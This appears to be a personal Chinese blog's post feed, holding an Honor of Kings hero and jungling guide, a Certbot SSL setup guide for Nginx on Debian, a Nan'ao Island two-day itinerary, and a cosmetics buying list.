节奏关键：前期速四反野，中期控龙分推，后期绕后切C。 二、出装与铭文推荐 1. 出装方案 暴击穿透流（当前主流）：\n贪婪之噬 → 抵抗之靴 → 暗影战斧 → 无尽战刃 → 宗师之力 → 破军 核心逻辑：暗影战斧提供穿透和冷却缩减，无尽+宗师提升暴击爆发，破军强化收割能力。 备选调整： 敌方多控：中期补纯净苍穹免伤 逆风局：冰痕之握+暴烈之甲提升容错 2. 铭文搭配 通用暴击流：\n10夺萃（续航） + 10鹰眼（穿透） + 7祸源3无双（暴击率+暴击效果） 极致穿透流：\n10隐匿（攻击/移速） + 10鹰眼 + 10异变（极致穿透） 三、连招技巧与实战应用 1. 基础连招 Gank起手式：\n1技能第一段（击飞）→ 普攻触发被动 → 1技能第二段追击 → 2技能横扫 → 大招收割 反野逃生：\n2技能反向跳墙 → 1技能穿墙 → 普攻接大招免伤 2. 高阶连招 团战切C：\n存被动→2技能突进→横扫→1技能击飞→大招霸体抗控→闪现离场 无伤磨塔：\n1技能穿墙进塔→普攻→2技能反向撤出（单次可造成1200+伤害） 四、打野节奏与运营思路 1. 前期（1-4级） 开局策略： 红BUFF开局：利用人形态2技能护盾无伤速刷 1分钟必争：中路河道之灵争夺（虎形态折返跳抢怪） 反野优先级：\n针对露娜/阿轲等弱势打野，2级可越墙突袭蓝区 2. 中期（4-10级） 控龙节奏： 暴君＞主宰：利用大招免伤强开龙团 带线牵制：优先推发育路，三路分推迫使敌方回防 抓人路线：\n优先发育路→对抗路→中轴，利用多段位移快速支援 3. 后期（10级后） 团战定位：\n第二时间进场，专盯交完闪现的射手/法师 逆风策略：\n无限带线牵制，利用三段位移实现“一拖三”战术 五、克制关系与操作细节 1. 英雄克制 天敌：\n东皇太一（压制）、张良（强控）、金蝉（限制位移） 猎物：\n鲁班七号、妲己等无位移脆皮，伽罗（破盾机制反制） 2. 细节技巧 能量管理：\n人形态多用1技能回能量，虎形态确保2技能命中回能 探草技巧：\n提前空A三次存被动，突进草丛瞬间触发击飞 地形利用：\n野区作战强度提升30%，多利用墙体折返跳拉扯 六、版本强度评估 优势：\n✔️ 全峡谷最强机动性（三段位移+墙体穿越）\n✔️ 前中期野区压制力TOP3\n✔️ 混伤机制克制单抗性阵容 弱点：\n❌ 后期团战容错率低\n❌ 依赖蓝BUFF续航（建议常带蓝buff） 火舞 一、技能机制与核心玩法 1. 技能解析与操作技巧 被动「忍蜂」\n每次释放技能后可翻滚位移，脱离战斗后首次普攻附带击退效果。核心技巧： 空A三次存被动，突进后强化普攻可瞬间打出击飞+高额伤害 设置中将「自动追击距离」调整为近距离，避免被动被野怪意外触发 一技能「飞翔龙炎阵」\n突进击飞技，CD短且可穿墙。建议搭配闪现实现超远距离开团（如一闪接大招） 二技能「花蝶扇」\n核心消耗技，命中后降低目标90%移速和200点法抗。设置优化： 开启「追踪轮盘施法」自动瞄准，提高命中率 配合被动翻滚调整站位，规避敌方前排阻挡 三技能「必杀·忍蜂」\n高爆发突进技，可击退路径上所有敌人。连招关键： 大招后接闪现可调整击退方向（如折返大闪） 优先攻击被二技能减抗的目标提升斩杀线 2. 战场定位 前期：远程消耗型法师，利用二技能压制中路 中期：刺客型法核，通过多段位移切入后排 后期：团战收割者，需把握进场时机避免被集火 二、出装与铭文推荐 1. 版本强势出装 爆发秒杀流（主流选择）：\n噬神之书 → 抵抗之靴 → 回响之杖 → 博学者之怒 → 虚无法杖 → 辉月 核心逻辑：回响+帽子组合提升中期爆发，辉月规避关键控制 备选调整： 敌方多回复：中期补梦魇之牙 逆风局：时之预言替代辉月提升容错 2. 铭文搭配 通用穿透流：\n10梦魇（法强/穿透） + 10心眼（攻速/穿透） + 10贪婪（续航） 极致机动流：\n10梦魇 + 10怜悯（冷却缩减） + 5狩猎5贪婪（移速/续航） 三、连招体系与实战应用 1. 基础连招 蹲草瞬杀：\n2（自动瞄准）→ 强化普攻 → 3（击退）→ 1（追击）→ 2（收尾） 可在1.5秒内打出4000+爆发伤害 反打连招：\n被动击退 → 2（减抗） → 1（控制） → 3（收割） 专克李白/韩信等突进型刺客 2. 高阶连招 团战开团技：\n闪现 → 3（群体击退） → 辉月（规避伤害） → 2（减速） → 1（补控） 需预判敌方C位站位，可配合鬼谷子等强控英雄 极限逃生技：\n2（减速追击者） → 被动翻滚穿墙 → 1（二次位移） 四、节奏把控与运营思路 1. 前期对线（1-4级） 清线技巧： 侧向释放二技能穿透兵线，搭配回响被动快速清兵 利用河蟹叠被动，2分钟时存3次强化普攻争夺暴君 游走策略： 优先支援发育路，通过墙体翻滚实现「无视野Gank」 2. 中期团战（4-10级） 控龙优先级： 黑暗暴君 \u0026gt; 主宰，利用二技能减抗提升rush速度 偷龙技巧：墙体翻滚进龙坑 → 大招击退 → 辉月规避惩戒 带线牵制： 通过「三线分推」迫使敌方回防，注意观察小地图预判围剿 3. 后期决胜（10级后） 团战定位： 第二时间进场，专盯交完保命技能的射手（如马可波罗净化CD） 通过「二闪」或「大闪」改变技能轨迹，出其不意切C 逆风翻盘： 利用超远距离二技能消耗守塔，经济差5000+时仍具备秒C能力 五、克制关系与细节优化 1. 英雄克制 天敌：\n东皇太一（压制）、金蝉（紧箍限制位移）、盾山（格挡飞行物） 猎物：\n鲁班七号（无位移）、王昭君（技能前摇明显）、伽罗（破盾机制反制） 2. 操作细节 视野掌控： 墙体翻滚时可探测草丛，但需保持与墙体边缘50码距离 二技能命中后获得3秒敌方视野，可破解兰陵王隐身 能量管理： 每次技能命中回复25能量，连招间隙穿插普攻维持续航 六、版本强度评估 优势：\n✔️ 全分段T1级中路刺客\n✔️ 混伤机制克制单抗性阵容\n✔️ 机动性天花板（5秒内可位移7次） 弱点：\n❌ 前期清线速度中等\n❌ 极度依赖二技能命中率 马可 一、技能机制与核心玩法 1. 技能解析与操作技巧 被动「连锁反应」\n普攻与技能命中叠加印记，叠满10层触发5秒真实伤害。\n关键细节：\n对线期优先用1技能消耗叠加印记，触发真伤后配合大招可秒杀脆皮 设置「自动追击距离」为近战模式，避免被野怪/小兵干扰印记叠加 一技能「华丽左轮」\n核心消耗技，子弹数量随攻速提升（最高11发）。\n操作要点：\n侧向45°角释放穿透兵线，提升清线效率 攻速达到150%时（末世+电刀+攻速鞋）达到最大输出频率 二技能「漫游之枪」\n位移+探草+20%伤害增益三合一技能。\n进阶技巧：\n500码内有敌人时触发预警特效，可探测草丛埋伏 反向跳跃规避钟馗钩子、吕布1技能等直线控制 三技能「狂热弹幕」\n高爆发AOE技能，攻速影响弹幕次数。\n使用策略：\n进场前确保触发被动真伤，搭配晕眩实现群体控制链 被集火时可用作穿墙逃生（如躲避兰陵王追击） 二、出装与铭文推荐 1. 版本主流出装方案 暴击穿透流（通用选择）：\n急速战靴 → 末世 → 闪电匕首 → 冰霜冲击 → 破晓 → 魔女斗篷\n核心逻辑：末世+电刀快速达成150%攻速阈值，冰霜冲击强化控制 备选调整： 敌方多回复阵容：中期补制裁之刃替代电刀 逆风局：不祥征兆替代冰霜冲击提升生存 半肉持续输出流（新手友好）：\n护甲鞋 → 末世 → 寒霜侵袭 → 不祥征兆 → 魔女斗篷 → 破晓\n特点：血量8500+，适合拉扯消耗打法\n2. 铭文搭配 攻速暴击流：\n10红月（攻速/暴击） + 10鹰眼（穿透） + 10狩猎（移速/攻速） 半肉续航流：\n10宿命（攻速/血量） + 10鹰眼 + 10夺萃（物理吸血） 三、连招体系与实战应用 1. 基础连招 对线消耗连招：\n1技能侧向扫射叠被动 → 2技能调整站位 → 强化普攻触发真伤\n伤害峰值：4级时可达2000+真实伤害\n爆发收割连招：\n存被动 → 2技能突进 → 1技能扫射 → 大招进场 → 晕眩控场\n应用场景：敌方脆皮站位集中时使用\n2. 高阶技巧 龙坑双控：\n利用墙体卡视野，2技能穿墙接大招+冰霜冲击实现双重控制抢龙 三线分推：\n2技能+大招连续穿墙带线，迫使敌方分散防守 四、节奏把控与运营思路 1. 发育策略 前期（1-4级）：\n开局优先拿红BUFF，1分钟争夺中路河道之灵 4级后配合辅助抓对抗路，利用真伤越塔强杀 中期（4-10级）：\n推掉发育路一塔后转中，末世成型进入强势期 控暴君＞主宰，大招+惩戒可秒杀残血龙 后期（10级后）：\n团战第二时间进场，专盯交完保命技能的射手 逆风局带线牵制，三路兵线运营翻盘 五、克制关系与细节优化 1. 英雄克制 天敌英雄：\n兰陵王（隐身秒杀）、花木兰（沉默爆发）、金蝉（限制位移） 优势对抗：\n项羽（真伤克制）、张飞（破盾机制）、鲁班七号（无位移） 2. 操作细节 能量管理：\n每次技能命中回复25能量，连招间隙穿插普攻维持续航 视野控制：\n2技能预警范围可探测草丛，提前预警兰陵王隐身接近 攻速阈值：\n卡攻速档位（72%/112%/152%），优先堆叠至150%阈值 六、版本强度评估 优势：\n✔️ 真伤机制无视坦克护甲\n✔️ 三位移技能实现顶级机动性\n✔️ 经济压制后具备一打三能力 弱点：\n❌ 前期对线强度垫底\n❌ 依赖红BUFF续航 梯度评级：巅峰赛1500+分段T1中游，推荐搭配瑶/明世隐双排\n战术扩展：\n面对干将/守约时建议换线发育 训练营重点练习「45°侧向1技能」与「折返大招」 新版护甲鞋性价比极高，逆风优先合成 （2025年5月）\n","permalink":"https://qfsyso.github.io/posts/honor-of-king/","summary":"镜 一、技能机制解析 被动-铸镜\n攻击目标后触发镜像标记，再次攻击可触发额外伤害并刷新技能CD，刷野/连招时需穿插平A触发被动。 一技能-开锋\n突进并强化普攻，主要位移和起手技能，命中减少冷却时间。 二技能-裂空\n范围伤害+回血+减速，开局优先加点用于续航和快速清野。 三技能-见影\n定身敌人并展开镜像场，本体与镜像协同攻击，核心连招与换位收割技能。 二、出装与铭文推荐 出装方案 核心装备：\n红色打野刀 → 抵抗之靴 → 暗影战斧 → 宗师之力 → 破军 → 碎星锤/名刀 高爆发流：破军+碎星锤瞬秒脆皮 生存调整：敌方控制多时换魔女斗篷，物理爆发高换反伤刺甲 铭文搭配 通用暴击流：\n10隐匿（移速/攻击） + 10鹰眼（穿透） + 2红月8异变（穿透+暴击） 极致爆发流：\n10祸源（暴击率） + 10隐匿 + 10鹰眼 三、连招技巧 基础连招：\n1A2A1A（3级前清野/消耗） 突进收割：\n31A21A（大招起手定身，接技能穿插平A） 飞雷神连招：\n31A2A1A3（镜像场内反复换位，持续刷新技能） 四、打野节奏思路 前期（1-4级） 开局红BUFF：\n点二技能快速清野，利用被动刷新CD提升效率 抢河道之灵：\n1分钟时抵达中路，配合惩戒争夺经济。 反野策略：\n针对敌方弱势打野（如李白、阿轲）入侵蓝区，压制发育。 中期（4-10级） 抓人优先级：\n优先抓发育路，利用大招越塔强杀脆皮。 控龙时机：\n击杀敌方打野后立即开暴君/主宰，扩大团队优势。 后期（10级后） 带线牵制：\n利用镜像快速清兵推塔，迫使敌方回防。 绕后切C：\n团战第二时间进场，直切射手/法师，连招秒杀后撤离。 五、团战与细节技巧 进场时机：\n等待敌方交关键控制技能（如张良大招）后再切入。 镜像场运用：\n横放大招可封锁路径，竖放便于换位追击残血。 探草技巧：","title":"Honor Of King"},{"content":"在 Debian 服务器上为部署在 Nginx 上的网站申请 SSL 证书， 一般使用 Let\u0026rsquo;s Encrypt 提供的免费证书最为方便、主流。推荐通过 Certbot 工具来自动申请和配置。 下面是详细步骤：\n🛠️ 步骤一：安装 Certbot 和 Nginx 插件 sudo apt update sudo apt install certbot python3-certbot-nginx -y 🖥️ 步骤二：确保你的 Nginx 配置正确 确保网站已经通过 HTTP 能正常访问。\nNginx 配置中必须有一个 server_name 指向你的域名，例如：\nserver { listen 80; server_name yourdomain.com www.yourdomain.com; root /var/www/yourdomain; index index.html index.htm; location / { try_files $uri $uri/ =404; } } 🌐 步骤三：申请 SSL 证书并自动配置 Nginx sudo certbot --nginx 然后按提示输入：\n邮箱地址（用于接收过期提醒）\n是否将 HTTP 强制跳转到 HTTPS（建议选择是） Yes\n域名（确认或选择） 1\n🔁 步骤四：自动续期（Let’s Encrypt 证书有效期为 90 天） Certbot 安装时会自动添加定时任务，但你可以手动测试续期功能：\nsudo certbot renew --dry-run 📁 证书路径（如需手动配置） 证书：/etc/letsencrypt/live/yourdomain.com/fullchain.pem\n私钥：/etc/letsencrypt/live/yourdomain.com/privkey.pem\n如果使用的是 阿里云 / 腾讯云 / Cloudflare 的 DNS 解析， 也可以使用 DNS 验证方式申请证书（支持不暴露 HTTP 服务）\n","permalink":"https://qfsyso.github.io/posts/debian-ng-ssl/","summary":"在 Debian 服务器上为部署在 Nginx 上的网站申请 SSL 证书， 一般使用 Let\u0026rsquo;s Encrypt 提供的免费证书最为方便、主流。推荐通过 Certbot 工具来自动申请和配置。 下面是详细步骤：\n🛠️ 步骤一：安装 Certbot 和 Nginx 插件 sudo apt update sudo apt install certbot python3-certbot-nginx -y 🖥️ 步骤二：确保你的 Nginx 配置正确 确保网站已经通过 HTTP 能正常访问。\nNginx 配置中必须有一个 server_name 指向你的域名，例如：\nserver { listen 80; server_name yourdomain.com www.yourdomain.com; root /var/www/yourdomain; index index.html index.htm; location / { try_files $uri $uri/ =404; } } 🌐 步骤三：申请 SSL 证书并自动配置 Nginx sudo certbot --nginx 然后按提示输入：","title":"Debian Ng Ssl"},{"content":"🌟 ​​南澳岛后宅镇两天一夜深度攻略​​ ​​住宿推荐​​：优先选择后宅镇海景民宿\n夜游后宅镇 ​​🌙 夜晚到达（18:00-21:00）​​\n​​后宅夜市漫游​​ 从南澳大桥进岛后直奔海滨路夜市，重点体验： ✅ ​​文婶甘草水果​​：甘梅粉+青芒是绝配，本地人最爱的解腻神器 ✅ ​​成伯反沙店​​：必点反沙咸蛋黄（比芋头更惊艳），糖霜裹得均匀不粘牙 ✅ ​​南澳岛打卡果汁冰​​：认准青澳湾铂雅酒店分店，推荐加脆波波\n📍贴士：夜市集中在龙滨路与港畔路交叉口，20:00后最热闹 ​\n​Day1：经典环岛线​​ ​⛅ 上午行程（8:00-12:00）​​ ​长山尾灯塔​​ 拍摄技巧：用广角镜头将灯塔与南澳大桥同框，清晨7:00前到达可避开旅行团 交通：601路公交直达（后宅镇中心出发约20分钟），自驾停车费10元/小时\n​田仔地质公园​​ 隐藏玩法：退潮时在礁石区赶海（需自备夹子/水桶），常见小螃蟹/贝类 安全提醒：浪大时勿靠近黑色礁石区（青苔易滑）\n​前江湾沙滩​​ 网红墙打卡：避开正午强光，侧光拍摄「我❤南澳」字样更出片 渔民体验：9:00-10:00可围观渔船卸货，直接向渔民购买新鲜鱼获（需砍价）\n🍜 午餐推荐（12:30-14:00）​​ ​​黄记海鲜沙筛面​​[本地推荐]：鲍鱼+鲜虾沙筛汤面，汤底用鱼骨熬制 ​​浩利食店​​：紫菜炒饭配苦瓜汤，人均30元饱腹感十足 避坑指南：慎选沙滩边流动摊贩，易出现海鲜不新鲜或价格虚高\n🌞 下午行程（14:30-18:30）​​ ​后宅三庙文化巡礼​​\n武帝庙： 重点看屋脊嵌瓷工艺（西游记人物场景栩栩如生）\n天后宫： 若逢初一/十五，可参与渔民祈福仪式（常集中在16:00左右） ​​山顶村深度体验​​ 海鲜采购：山顶市场下午15:00上新，推荐宅鱿（60元/斤）和鱼露（认准「金龙牌」） 手作体验：村内「阿嫲粿品坊」可预约红桃粿制作（需提前2小时联系）\n​白鹭生态公园​​ 最佳观鸟点：西侧芦苇丛（17:00后白鹭归巢） 摄影建议：携带长焦镜头捕捉白鹭捕食瞬间\n🌄 傍晚备选​​ ​​钱澳湾灯塔​​：白色塔身+薄荷绿玻璃窗，适合拍摄日系风写真（距离后宅镇6公里，打车约15分钟）\n🍲 晚餐推荐​​ ​​裕福记海鲜鸡炉​​[攻略推荐]：石橄榄汤底+现杀走地鸡，搭配南澳紫菜涮煮 ​​鲜宴·海鲜私厨​​[攻略推荐]：芝士焗小青龙128元/只，性价比高于大排档\n​Day2：人文探索 \u0026amp; 周边延伸​​ 🌅 上午行程（8:30-12:00）​​ ​后花园生态村​​ 必玩项目：海阔天空观景台（俯瞰360°海天全景） 特色体验：25元/人含茶座的「农家乐」，品凤凰单丛赏茶田风光\n​​风车山探秘​​ 自驾路线：导航「蛴仔澎」（注意45-46号风机机位最佳） 非自驾方案：包三轮车上下山（约80元/车），山路陡峭慎选电动车\n🦞 午餐推荐​​ ​​金龙潮汕私房菜​​：卤水鹅肝拼盘+砂锅粥，人均70元吃撑 ​​胖哥有炸​​[攻略推荐]：炸九肚鱼外酥里嫩，配薄荷酱解腻\n🌿 下午行程（14:00-17:00）​​ ​​总兵府​​ 历史迷必看：明代海防地图/郑成功练兵遗址，蹭导游讲解更生动\n​​走马铺彩虹海​​ 拍摄攻略：晴天下午顺光拍摄，彩色浮球与蓝色海水对比强烈 隐藏彩蛋：附近「网红树」已围栏收费（不推荐特意前往）\n🚗 返程准备​​ 17:30前离岛可避开晚高峰，南澳大桥返程不再收取过路费 伴手礼推荐：山顶市场购买真空包装宅鱿（35元/包）或然记糖水铺的即食甜品\n📌 ​​实用贴士​​ ​​潮汐安全​​：田仔地质公园需查「潮汐表精灵」APP，涨潮前1小时撤离 ​​摄影时段​​：日出拍青澳湾，日落拍长山尾灯塔，星空拍摄选云澳渔港\n","permalink":"https://qfsyso.github.io/posts/nanao-planb/","summary":"🌟 ​​南澳岛后宅镇两天一夜深度攻略​​ ​​住宿推荐​​：优先选择后宅镇海景民宿\n夜游后宅镇 ​​🌙 夜晚到达（18:00-21:00）​​\n​​后宅夜市漫游​​ 从南澳大桥进岛后直奔海滨路夜市，重点体验： ✅ ​​文婶甘草水果​​：甘梅粉+青芒是绝配，本地人最爱的解腻神器 ✅ ​​成伯反沙店​​：必点反沙咸蛋黄（比芋头更惊艳），糖霜裹得均匀不粘牙 ✅ ​​南澳岛打卡果汁冰​​：认准青澳湾铂雅酒店分店，推荐加脆波波\n📍贴士：夜市集中在龙滨路与港畔路交叉口，20:00后最热闹 ​\n​Day1：经典环岛线​​ ​⛅ 上午行程（8:00-12:00）​​ ​长山尾灯塔​​ 拍摄技巧：用广角镜头将灯塔与南澳大桥同框，清晨7:00前到达可避开旅行团 交通：601路公交直达（后宅镇中心出发约20分钟），自驾停车费10元/小时\n​田仔地质公园​​ 隐藏玩法：退潮时在礁石区赶海（需自备夹子/水桶），常见小螃蟹/贝类 安全提醒：浪大时勿靠近黑色礁石区（青苔易滑）\n​前江湾沙滩​​ 网红墙打卡：避开正午强光，侧光拍摄「我❤南澳」字样更出片 渔民体验：9:00-10:00可围观渔船卸货，直接向渔民购买新鲜鱼获（需砍价）\n🍜 午餐推荐（12:30-14:00）​​ ​​黄记海鲜沙筛面​​[本地推荐]：鲍鱼+鲜虾沙筛汤面，汤底用鱼骨熬制 ​​浩利食店​​：紫菜炒饭配苦瓜汤，人均30元饱腹感十足 避坑指南：慎选沙滩边流动摊贩，易出现海鲜不新鲜或价格虚高\n🌞 下午行程（14:30-18:30）​​ ​后宅三庙文化巡礼​​\n武帝庙： 重点看屋脊嵌瓷工艺（西游记人物场景栩栩如生）\n天后宫： 若逢初一/十五，可参与渔民祈福仪式（常集中在16:00左右） ​​山顶村深度体验​​ 海鲜采购：山顶市场下午15:00上新，推荐宅鱿（60元/斤）和鱼露（认准「金龙牌」） 手作体验：村内「阿嫲粿品坊」可预约红桃粿制作（需提前2小时联系）\n​白鹭生态公园​​ 最佳观鸟点：西侧芦苇丛（17:00后白鹭归巢） 摄影建议：携带长焦镜头捕捉白鹭捕食瞬间\n🌄 傍晚备选​​ ​​钱澳湾灯塔​​：白色塔身+薄荷绿玻璃窗，适合拍摄日系风写真（距离后宅镇6公里，打车约15分钟）\n🍲 晚餐推荐​​ ​​裕福记海鲜鸡炉​​[攻略推荐]：石橄榄汤底+现杀走地鸡，搭配南澳紫菜涮煮 ​​鲜宴·海鲜私厨​​[攻略推荐]：芝士焗小青龙128元/只，性价比高于大排档\n​Day2：人文探索 \u0026amp; 周边延伸​​ 🌅 上午行程（8:30-12:00）​​ ​后花园生态村​​ 必玩项目：海阔天空观景台（俯瞰360°海天全景） 特色体验：25元/人含茶座的「农家乐」，品凤凰单丛赏茶田风光\n​​风车山探秘​​ 自驾路线：导航「蛴仔澎」（注意45-46号风机机位最佳） 非自驾方案：包三轮车上下山（约80元/车），山路陡峭慎选电动车\n🦞 午餐推荐​​ ​​金龙潮汕私房菜​​：卤水鹅肝拼盘+砂锅粥，人均70元吃撑 ​​胖哥有炸​​[攻略推荐]：炸九肚鱼外酥里嫩，配薄荷酱解腻\n🌿 下午行程（14:00-17:00）​​ ​​总兵府​​ 历史迷必看：明代海防地图/郑成功练兵遗址，蹭导游讲解更生动","title":"Nanao PlanB"},{"content":"购买前 量力而行，心意到了就行了。 这南墙也不一定非要撞过去。\n购买渠道： 某东 （隔天就到了） 淘天喵（便宜一点） 拼夕夕百亿补贴 （便宜亿点）\n护肤类 洁面产品： 用于清洁面部皮肤，去除污垢、油脂和杂质，为后续化妆步骤打下良好的基础。\n化妆水 / 爽肤水： 帮助收缩毛孔，补水保湿，使肌肤更加水润，为上妆做好准备。\n乳液 / 面霜： 滋润肌肤，锁住水分，防止皮肤干燥，使底妆更加服帖。\n注意 ​​敏感肌​​：优先无酒精、无香精的氨基酸洁面+修护型水乳。 ​​油痘肌​​：含酸类或控油成分的洁面+平衡水油的水乳）。 ​​干皮​​：保湿抗氧化洁面+抗衰提亮水乳。 性价比党/​​​​学生党：经典国货套装珀莱雅/自然堂闭眼入。\n洁面产品： 油皮：可以选择清洁力较强的非 “皂性” 洁面产品，如含有水杨酸、皂基等成分的洗面奶，能有效去除皮肤表面多余的油脂和污垢。 干皮和敏感皮：应选用温和、保湿的洁面产品，如氨基酸洗面奶，其 pH 值接近皮肤的 pH 值，能在清洁的同时保护皮肤的屏障功能。\n化妆水 / 爽肤水： 油皮：适合使用清爽型的化妆水，含有金缕梅、薄荷等成分，具有控油、收缩毛孔的作用。 干皮：可选择滋润型的化妆水，含有透明质酸、甘油等保湿成分，能为肌肤补充水分。 敏感皮：则适合具有舒缓、修复功能的爽肤水，含有马齿苋、洋甘菊等成分，可减轻皮肤的敏感症状。\n精华液： 美白：想要美白的人群可选择含有烟酰胺、维生素 C、传明酸等成分的精华液，能抑制黑色素的生成，提亮肤色。 抗皱：有抗皱需求的人群可以使用含有视黄醇、胜肽、玻色因等成分的精华液，能促进胶原蛋白的生成，减少皱纹。 保湿：干性皮肤可使用含有玻尿酸、角鲨烷等成分的保湿精华液，为肌肤深层补水保湿。\n乳液 / 面霜： 油皮：选择质地轻薄、不油腻的乳液，含有茶树精油、薰衣草等成分，具有控油、消炎的作用。 干皮：适合质地浓稠、滋润度高的面霜，含有羊毛脂、凡士林等成分，能在皮肤表面形成一层保护膜，防止水分流失。 混合皮：T 区使用清爽的乳液，两颊使用滋润的面霜。\n眼霜： 黑眼圈：针对黑眼圈问题，可选择含有咖啡因、维生素 K 等成分的眼霜，能促进眼部血液循环，减轻黑眼圈。 眼部细纹：有眼部细纹的人群可以使用含有胶原蛋白、辅酶 Q10 等成分的眼霜，能增强眼部肌肤的弹性。\nbuybuybuy 可复美 柔肤水 500ml 65 补水保湿，质地清爽不粘腻，易于吸收。可用于日常补水、湿敷等。 珀莱雅红宝石面霜 50g 165 保湿滋养，淡纹紧致，饱满肌肤 珀莱雅水动力护肤套装 [100g洁面 135ml水乳] 79 plus版本 面+水+乳+霜 119 改善面部毛孔粗大、暗沉粗糙等问题，帮助肌肤锁水保湿，调节水油平衡，令肌肤细腻通透。 优时颜 [水150ml+乳100g] 140\n专门为敏感肌量身定制，能够迅速缓解肌肤的泛红、瘙痒等不适症状，让肌肤免受外界刺激的伤害。 雅诗·兰黛(ESTĒE LAUDER) 买不起 神仙水(SK-II) 同上 海蓝之谜(La Mer) 同上\n防晒霜： 防止紫外线对皮肤的伤害，避免晒黑、晒伤，同时也能减少紫外线对化妆品的破坏。\n日常通勤：日常通勤可选择防晒指数（SPF）30 - 50 的防晒霜，比较温和。\n薇诺娜防晒乳 50ml 69 SPF48、PA+++，防护力适合日常通勤或室内使用。采用无酒精、无香精、无色素的极简配方，搭配马齿苋提取物和青刺果油，能在防晒的同时修护屏障，做完医美或换季泛红时使用也毫无负担。乳霜质地润而不黏，易于涂抹。 珀莱雅云朵防晒 110ml 179 SPF45、PA+++，日常通勤逛街足够。对防晒剂分体进行了改良，提高了透明度和均匀度。复配了 EUK124、百敏舒等舒缓修护成分，敏敏肌也能用。有一定的防水防汗效果。缺点：需用卸妆产品卸干净。 优佳(Ultrasun) 小紫瓶 50ml 235 小粉+小紫 100ml 490\nSPF50、PA+++，干敏肌必囤，适合日常通勤，全光谱防护，乳液状质地，轻盈不厚重，流动性好，易推开，成膜快，不黏腻，与底妆搭配服帖，微微均衡肤色，不假白。\n户外活动：长时间户外活动则需要使用 SPF50 以上的高倍数防晒霜，防晒效果更好。\n珀莱雅盾护防晒液​ 100ml 169 SPF50+ PA++++（浴后SPF41），适合高温暴汗环境,适用油皮、混油皮，尤其适合军训、冲浪等极限户外活动 百雀羚银河防晒霜 100ml 159 SPF50+、PA++++。拥有出色的保湿能力，让肌肤在防晒的同时保持水润，在炎热天气中也不会因防晒而干燥缺水。具有防水防汗特性，无论运动还是出汗，都能持续发挥防晒功效。 兰蔻小白管防晒霜(Lancome) 30ml 284 SPF50+、PA++++。 提供全波段紫外线防护。含有多种保湿成分和抗氧化剂，如薄荷精华和玫瑰花瓣提取物，有助于保持肌肤水润和抵抗自由基侵害，质地轻盈，上脸后感觉清爽舒适。 资生堂蓝胖子防晒霜(Shiseido) 50ml 119\nSPF50+、PA++++。防水防汗能力一流，无论是海边度假还是户外徒步，都能提供全面的防晒保护。质地水润清爽，干皮、油皮都适用。\n底妆类 隔离霜： 隔离彩妆、灰尘和紫外线，修饰肤色，使底妆更加持久。\n完美日记 隔离霜30g 98 户外持妆美白提亮肤色妆前乳\n雅诗·兰黛(ESTĒE LAUDER) 隔离霜30ml 222 SPF 30/PA+++ 为后续上妆提供滋润的底妆基础，让妆容更加服帖自然。\n粉底液： 均匀肤色，遮盖瑕疵，调整肌肤色调，打造光滑细腻的肌肤质感。\n卡姿兰 菁华养肤粉底液 99 轻盈透气遮瑕保湿持久控油\n圣罗兰(YSL) 气垫 375 水润保湿，底妆清爽不粘腻。出粉细腻，上妆轻薄。水滴型粉扑，方便修饰细节。。\n雅诗·兰黛(ESTĒE LAUDER) DW粉底液 465 高遮瑕、持久、美白、细腻\n遮瑕膏： 针对面部的痘痘、斑点、黑眼圈等瑕疵进行重点遮盖，如阿玛尼权力持妆遮瑕乳。\n粉饼 / 散粉： 定妆，吸收面部油脂，防止脱妆，使妆容更加细腻、持久，如纪梵希四宫格散粉。\n彩妆类 眉笔 / 眉粉： 修饰眉毛形状，填补眉毛空缺，让眉毛更加浓密、立体，如卡奇色彩极细眉笔。\n眼影： 通过不同颜色的搭配，塑造眼部轮廓，增加眼部层次感和深邃感，如 3CE OVERTAKE 九宫格眼影盘。\n眼线笔 / 眼线液： 勾勒眼部线条，使眼睛更加有神，放大双眼，如植村秀砍刀眉笔。\n睫毛膏： 拉长、加密睫毛，使睫毛更加卷翘，增强眼部的魅力，如兰蔻天鹅颈睫毛膏。\n腮红： 增添面部红润气色，修饰脸型，使面部更加立体，如 NARS 腮红。\n口红 / 唇彩： 改变唇部颜色，提升整体妆容的气色和气质。\n魅可 M.A.C#935红宝石 190 显色度和遮瑕力都很棒，完全不挑肤色 纪梵希(Givenchy) 高定香榭唇膏 #N333 女神红 3.4g 320 丝滑柔润的口红质地，加上半哑光的效果，呈现精致唇妆，尽显迷人的气质。小巧便携造型，随时随地补妆。 迪奥(DIOR)烈艳蓝金口红丝绒哑光999唇膏3.5g 380 能够保持较长时间显色，细腻柔润不易脱妆。丝绒哑光质感，气场十足，厚涂正红色，薄涂偏橘红，不挑皮肤超显白 TOM FORD黑管TF口红16哑光斯嘉丽红唇膏 460 质地非常丝滑，不粘腻，还能遮盖唇纹，简直让人爱不释手。论是黄皮肤还是黑皮肤，都能友好地提升亮度。\n工具类 化妆刷： 包括粉底刷、腮红刷、眼影刷、眉刷等，用于涂抹化妆品，使妆容更加均匀、自然。\n美妆蛋： 用于涂抹粉底液和遮瑕膏，能打造出轻薄、服帖的底妆。\n睫毛夹： 使睫毛卷翘，增加眼睛的立体感和神采。\n化妆镜： 用于观察化妆效果，确保妆容的精致度。\n面膜 功效分类 保湿面膜：含有透明质酸、甘油等保湿成分，能够快速为肌肤补充水分，缓解肌肤干燥，使肌肤变得水润光滑。适合各种肤质，尤其是干性肌肤。例如可复美水润修护保湿面膜，以透明质酸钠为主要成分，保湿效果出色。 美白面膜：常含有烟酰胺、维生素 C、熊果苷等成分，能抑制黑色素生成，提亮肤色，改善暗沉。适合有美白需求的人群，但敏感性肌肤需谨慎使用。如 OLAY 小白瓶面膜，烟酰胺含量较高，美白效果较为显著。 修复面膜：含有神经酰胺、马齿苋提取物、积雪草提取物等成分，可修复受损肌肤屏障，舒缓肌肤敏感，减轻炎症反应。适用于敏感肌、痘痘肌或医美术后肌肤。像敷尔佳积雪草舒缓修护面膜，对于肌肤修复有很好的效果。 清洁面膜：一般含有高岭土、活性炭、膨润土等成分，能吸附皮肤表面的油脂、污垢和角质，深层清洁毛孔。适合油性肌肤和毛孔粗大的人群。例如悦木之源泥娃娃活性炭清肌面膜，清洁力强，能有效清除毛孔内的杂质。 使用频率：保湿面膜可每周使用 2 - 3 次；美白面膜和修复面膜通常每周使用 1 - 2 次；清洁面膜一般每周使用 1 次，过度使用可能会损伤皮肤屏障。\n护手霜 功效分类 保湿护手霜：含有天然油脂、凡士林、尿素等成分，能为手部肌肤补充水分和油脂，防止干燥、开裂，适合日常手部护理。如欧舒丹护手霜，含有多种植物油脂，保湿效果好，香味也很宜人。 